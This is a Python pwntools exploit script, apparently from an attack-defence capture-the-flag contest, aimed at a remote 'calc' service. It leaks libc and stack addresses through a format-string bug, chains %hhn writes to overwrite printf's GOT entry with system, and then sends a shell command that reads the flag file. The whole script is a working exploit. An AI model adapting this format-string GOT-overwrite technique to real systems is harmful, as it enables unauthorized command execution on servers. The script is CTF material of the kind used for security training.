from pwn import *

stdin_so = 0x00000000003C48E0
printf_got = 0x000000602038
system_so = 0x0000000000045390
target = 0x000000602038
ebp4 = 0
def pwn(ip):
	p = remote(ip,1082)
	global ebp4
	#p = process("./calc")	
	p.recvuntil(">")
	p.sendline("(1%6$p)")
	p.recvuntil(">")
	p.sendline("((1%6$p)")
	p.recvuntil("Expecting )\n")
	stdin = int(p.recv(14),16)
	libc_base = stdin - stdin_so
	system = libc_base + system_so
	#print "libc_base : " + hex(libc_base)
	#print "system : " + hex(system)
	p.recvuntil(">")
	p.sendline("(1%8$p)")
	p.recvuntil("Expecting )\n")
	stack = int(p.recv(14),16)
	#print hex(stack)
	ebp1 = stack + 0x20 #%12$p
	ebp2 = stack + 0x40 #%16$p
	ebp3 = stack + 0x60 #%20$p
	ebp4 = stack + 0x70 #%24$p
	#target = stack + 0x110
	
    step1(p)
	step2(p)
	step3(p)
	step4(p)
	step5(p)
	step6(p)

	byte1 = system & 0xff
	byte2 = (system>>8) & 0xff
	byte3 = (system>>16) & 0xff
	byte4 = (system>>24) & 0xff
	byte5 = (system>>32) & 0xff
	byte6 = (system>>40) & 0xff

	payload = "(1%" + str(byte1) + "c%26$hhn"
	if byte2 > byte1:
		payload += "%" + str(byte2 - byte1) + "c%27$hhn"
	else:
		payload += "%" + str(0x100 + byte2 - byte1) + "c%27$hhn"

	if byte3 > byte2:
		payload += "%" + str(byte3 - byte2) + "c%28$hhn"
	else:
		payload += "%" + str(0x100 + byte3 - byte2) + "c%28$hhn"

	if byte4 > byte3:
		payload += "%" + str(byte4 - byte3) + "c%29$hhn"
	else:
		payload += "%" + str(0x100 + byte4 - byte3) + "c%29$hhn"

	if byte5 > byte4:
		payload += "%" + str(byte5 - byte4) + "c%30$hhn"
	else:
		payload += "%" + str(0x100 + byte5 - byte4) + "c%30$hhn"

	if byte6 > byte5:
		payload += "%" + str(byte6 - byte5) + "c%31$hhn"
	else:
		payload += "%" + str(0x100 + byte6 - byte5) + "c%31$hhn"

	payload += ")"
	p.sendline(payload)
	p.sendline("(1cat /opt/xnuca/flag.txt;)")
	p.recvuntil("gongfang")
	flag = p.recvline()
	flag = flag.replace("}","").replace("{","")
	print flag
	return flag

def step1(p):
	word1 = target & 0xff
	payload = "(1%" + str(word1) + "c%24$hhn)"
	p.sendline(payload)

	word1 = (ebp4 & 0xff) + 1
	payload = "(1%" + str(word1) + "c%20$hhn)"
	p.sendline(payload)

	word1 = (target >> 8) & 0xff
	payload = "(1%" + str(word1) + "c%24$hhn)"
	p.sendline(payload)

	word1 = (ebp4 & 0xff) + 2
	payload = "(1%" + str(word1) + "c%20$hhn)"
	p.sendline(payload)

	word1 = (target >> 16) & 0xff
	payload = "(1%" + str(word1) + "c%24$hhn)"
	p.sendline(payload)
	
def step2(p):
	word1 = (ebp4 & 0xff) + 8
	payload = "(1%" + str(word1) + "c%20$hhn)"
	p.sendline(payload)

	word1 = (target & 0xff) + 1
	payload = "(1%" + str(word1) + "c%24$hhn)"
	p.sendline(payload)

	word1 = (ebp4 & 0xff) + 1 + 8
	payload = "(1%" + str(word1) + "c%20$hhn)"
	p.sendline(payload)

	word1 = (target >> 8) & 0xff
	payload = "(1%" + str(word1) + "c%24$hhn)"
	p.sendline(payload)

	word1 = (ebp4 & 0xff) + 2 + 8
	payload = "(1%" + str(word1) + "c%20$hhn)"
	p.sendline(payload)

	word1 = (target >> 16) & 0xff
	payload = "(1%" + str(word1) + "c%24$n)"
	p.sendline(payload)

def step3(p):
	word1 = (ebp4 & 0xff) + 0x10
	payload = "(1%" + str(word1) + "c%20$hhn)"
	p.sendline(payload)

	word1 = (target & 0xff) + 2
	payload = "(1%" + str(word1) + "c%24$hhn)"
	p.sendline(payload)

	word1 = (ebp4 & 0xff) + 1 + 0x10
	payload = "(1%" + str(word1) + "c%20$hhn)"
	p.sendline(payload)

	word1 = (target >> 8) & 0xff
	payload = "(1%" + str(word1) + "c%24$hhn)"
	p.sendline(payload)

	word1 = (ebp4 & 0xff) + 2 + 0x10
	payload = "(1%" + str(word1) + "c%20$hhn)"
	p.sendline(payload)
	
	word1 = (target >> 16) & 0xff
	payload = "(1%" + str(word1) + "c%24$n)"
	p.sendline(payload)

def step4(p):
	word1 = (ebp4 & 0xff) + 0x18
	payload = "(1%" + str(word1) + "c%20$hhn)"
	p.sendline(payload)

	word1 = (target & 0xff) + 3
	payload = "(1%" + str(word1) + "c%24$hhn)"
	p.sendline(payload)

	word1 = (ebp4 & 0xff) + 1 + 0x18
	payload = "(1%" + str(word1) + "c%20$hhn)"
	p.sendline(payload)

	word1 = (target >> 8) & 0xff
	payload = "(1%" + str(word1) + "c%24$hhn)"
	p.sendline(payload)

	word1 = (ebp4 & 0xff) + 2 + 0x18
	payload = "(1%" + str(word1) + "c%20$hhn)"
	p.sendline(payload)
	
	word1 = (target >> 16) & 0xff
	payload = "(1%" + str(word1) + "c%24$n)"
	p.sendline(payload)

def step5(p):
	word1 = (ebp4 & 0xff) + 0x20
	payload = "(1%" + str(word1) + "c%20$hhn)"
	p.sendline(payload)

	word1 = (target & 0xff) + 4
	payload = "(1%" + str(word1) + "c%24$hhn)"
	p.sendline(payload)

	word1 = (ebp4 & 0xff) + 1 + 0x20
	payload = "(1%" + str(word1) + "c%20$hhn)"
	p.sendline(payload)

	word1 = (target >> 8) & 0xff
	payload = "(1%" + str(word1) + "c%24$hhn)"
	p.sendline(payload)

	word1 = (ebp4 & 0xff) + 2 + 0x20
	payload = "(1%" + str(word1) + "c%20$hhn)"
	p.sendline(payload)

	word1 = (target >> 16) & 0xff
	payload = "(1%" + str(word1) + "c%24$n)"
	p.sendline(payload)

def step6(p):
	word1 = (ebp4 & 0xff) + 0x28
	payload = "(1%" + str(word1) + "c%20$hhn)"
	p.sendline(payload)

	word1 = (target & 0xff) + 5
	payload = "(1%" + str(word1) + "c%24$hhn)"
	p.sendline(payload)

	word1 = (ebp4 & 0xff) + 1 + 0x28
	payload = "(1%" + str(word1) + "c%20$hhn)"
	p.sendline(payload)

	word1 = (target >> 8) & 0xff
	payload = "(1%" + str(word1) + "c%24$hhn)"
	p.sendline(payload)

	word1 = (ebp4 & 0xff) + 2 + 0x28
	payload = "(1%" + str(word1) + "c%20$hhn)"
	p.sendline(payload)
	word1 = (target >> 16) & 0xff
	payload = "(1%" + str(word1) + "c%24$n)"
	p.sendline(payload)	

pwn(ip)